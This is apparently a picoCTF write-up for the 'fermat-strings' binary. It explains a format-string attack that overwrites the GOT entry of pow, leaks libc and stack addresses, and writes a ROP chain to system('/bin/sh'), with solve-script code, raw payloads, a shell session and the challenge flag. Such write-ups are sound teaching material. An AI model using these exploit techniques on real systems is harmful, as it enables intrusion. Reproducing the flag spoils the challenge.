# fermat-strings

Format-string Exploit, GOT Overwrite, ret2libc

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Canary protection is enabled, but we can bypass that protection and write the ROP chain directly into the retaddr (and onwards) if there is a format-string vulnerability. 

## Overview of Binary

The binary accepts two strings of at most size `SIZE = 0x100` into buffers `A` and `B`, before setting the first newline character to a null byte. 

It then calls `atoi` on the buffers and exits if an error occurs, as shown

```c
a = atoi(A);
b = atoi(B);

if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
}
```

The format string vulnerability occurs after this, where the processed string including the contents of `A` and `B` is passed as a singular argument to `printf`. 

```c
char buffer[SIZE];
snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
printf(buffer);
```

Note that to pass the `atoi` check (i.e. to ensure that `a != 0 and b != 0`, where `atoi` returns 0 on error), we simply need to ensure that the initial substring of `A` and `B` are stringified integers (which are not 0). This is because `atoi` only cares about the initial part of the string (see [man atoi](https://man7.org/linux/man-pages/man3/atoi.3.html)). 

For example, a string like `2%10$p` works as shown

```
(venv) asdiml@DESKTOP-?????:/mnt/d/CTFs/picoCTF/Pwn/fermat-strings$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 2%10$p
B: 2%10$p
Calculating for A: 20x702430312532 and B: 20x702430312532
```

Lastly, it calls `pow` to cube `a` and `b` and compare it to `i`-cubed for some small range of `i`, printing the value of `i` if `a^3 + b^3 == i^3`. By [Fermat's Last Theorem](https://en.wikipedia.org/wiki/Fermat%27s_Last_Theorem), however, this is impossible (and also is irrelevant to the challenge).  

## Obtaining the libc and Linker

We can obtain the libc and linker used on the server by running the Ubuntu Docker image specified in the provided [Dockerfile](./Dockerfile)

```docker
docker run --rm -it -v "$PWD":/app ubuntu@sha256:703218c0465075f4425e58fac086e09e1de5c340b12976ab9eb8ad26615c3715
```

and looking in `/usr/lib/x86_64-linux-gnu` for the libc and linker

```
root@6f2d04dd2427:/# cd /usr/lib/x86_64-linux-gnu
root@6f2d04dd2427:/usr/lib/x86_64-linux-gnu# ls -la | grep -E "libc.so.6|ld-linux-x86-64.so.2"
lrwxrwxrwx  1 root root      10 Aug 17  2020 ld-linux-x86-64.so.2 -> ld-2.31.so
lrwxrwxrwx  1 root root      12 Aug 17  2020 libc.so.6 -> libc-2.31.so
```

Lastly, the `-v "$PWD":/app` option which mounts a volume of the host machine into the Docker container (at the target directory `/app`) allows for easy copying of those files outside of the container

```
root@6f2d04dd2427:/usr/lib/x86_64-linux-gnu# cp libc.so.6 /app
root@6f2d04dd2427:/usr/lib/x86_64-linux-gnu# cp ld-linux-x86-64.so.2 /app
```

P.S. I moved these into the `./patched` sub-directory before copying `chall` over to patch it with `pwninit`. 

## Overwriting GOT Entry of `pow` with address of `main`

The issue with the program flow of the challenge binary, as is, is that the format string vulnerability occurs only once. However, we need to use results from an arb (arbitrary) read using the vulnerability (i.e. to leak the libc base address and an address on the stack) to arb write with the vulnerability (i.e. to overwrite the retaddr of `main` with a call to `system`), which cannot occur within only one vulnerability instance. 

We thus need the fmtstr vulnerability to occur more than once, and the only way to do this is for `main` (or some address in `main` before the fmtstr vuln) to run again. 

Since `pow` is called after the fmtstr vulnerability occurs, we can overwrite its entry in the GOT to instead call `main`. 

This can be done entirely in `A`, without any payload being used in `B`. 

### Minor Subtleties when conducting the Fmtstr Exploit

As the string "Calculating for A: " is printed before that which we put into `A`, we need to subtract the length of that stringn from `N` of the first `%Nc` specifier, where `N` is some integer. 

Additionally, to pass the `atoi()` check, we prepend `b'1AAAAAAA'` to the payload, and thus an additional 8 needs to be subtracted from `N`. 

The following code block shows how the payload is crafted, where you can view [the solve script](./solve.py) for a few more lines of explanation as comments

```python
payload_bytes = fmtstr_payload(fmtstr_offset_bufA + 1, {exe.got.pow: exe.symbols.main}, write_size='short')
payload = bytearray(payload_bytes)

first_spcfier_numchars = int(payload[1:5].decode())
first_spcfier_numchars_modified_bytes = str(first_spcfier_numchars - (buf_len_before_bufA + 8)).encode()
payload[1:5] = first_spcfier_numchars_modified_bytes
```

## Leaking the libc base addr and saved `rbp`

How the libc base address and saved `rbp` of the previous stack frame are leaked is basically the same as that used in [guessing-game-2](../guessing-game-2/solve.md#leaking-the-libc-base-addr-and-saved-ebp). 

The location where retaddr for the third `main` call (first call was to overwrite the GOT `pow` entry, second call for these leaks, and third is to ret2libc) is stored is then a fixed offset from the leaked saved `rbp`. This offset can be easily obtained by stepping through program execution with gdb and getting the difference between the two at the point when the third fmtstr vulnerability occurs. 

## Restoring `exe.got.pow`, and ret2libc

As with most pwn challs, our final goal is to spawn a shell by overwriting the return address of `main` with a ROP chain that runs `system("/bin/sh")`. 

However, if `pow` keeps on calling `main`, then `main` will never be able to return (see source code below)

```c
int main(void)
{

  ...

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}
```

Thus, our payload will not only need to write in the ROP chain onto the address starting from the retaddr, but also write the original value of the GOT `pow` entry back into the table (so that the for loop can execute properly till completion). 

In the [solve script](./solve.py), ROP chain construction and the creation of the `writes` dictionary is done as follows

```python
rop_chain = b''.join([
    p64(0x400b34), # ret gadget for stack alignment
    p64(0x400b33), # pop rdi gadget
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(libc.symbols.system),
])

writes = {
    exe.got.pow: 0x400716 # Restore original value in GOT table
}
for i in range(len(rop_chain)//8):
    writes[retaddr + i*8] = u64(rop_chain[i*8:(i+1)*8])
```

Finally, we create the payload, edit it in the same way as when we [overwrote the GOT for the first time](#overwriting-got-entry-of-pow-with-address-of-main), and send it to profit. 

## Flag

```bash
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] payload_1=bytearray(b'%2076c%14$lln%9c%15$hhna@\x10`\x00\x00\x00\x00\x00B\x10`\x00\x00\x00\x00\x00')
[*] hex(libc.address)='0x7f8d6a638000'
[*] hex(saved_rbp)='0x7ffd84b16400'
[*] payload_3=bytearray(b'%1787c%28$lln%42c%29$hhn%1011c%30$llnc%31$lln%12c%32$hhn%33$hhn%51408c%34$lln%8602c%35$lln%29886c%36$hn%22c%37$hn%5391c%38$hn%39$hnaaaab@\x10`\x00\x00\x00\x00\x00B\x10`\x00\x00\x00\x00\x00\x90]\xb1\x84\xfd\x7f\x00\x00\x88]\xb1\x84\xfd\x7f\x00\x00\x92]\xb1\x84\xfd\x7f\x00\x00\x8a]\xb1\x84\xfd\x7f\x00\x00\xa0]\xb1\x84\xfd\x7f\x00\x00\x98]\xb1\x84\xfd\x7f\x00\x00\xa2]\xb1\x84\xfd\x7f\x00\x00\x9a]\xb1\x84\xfd\x7f\x00\x00\xa4]\xb1\x84\xfd\x7f\x00\x00\x9c]\xb1\x84\xfd\x7f\x00\x00')
[*] Switching to interactive mode
Calculating for A: 1AAAAAAA                                                                    

... TRUNCATED ...

                                      aaaab@\x10` and B: 1
$ ls
flag.txt
run
$ cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
```
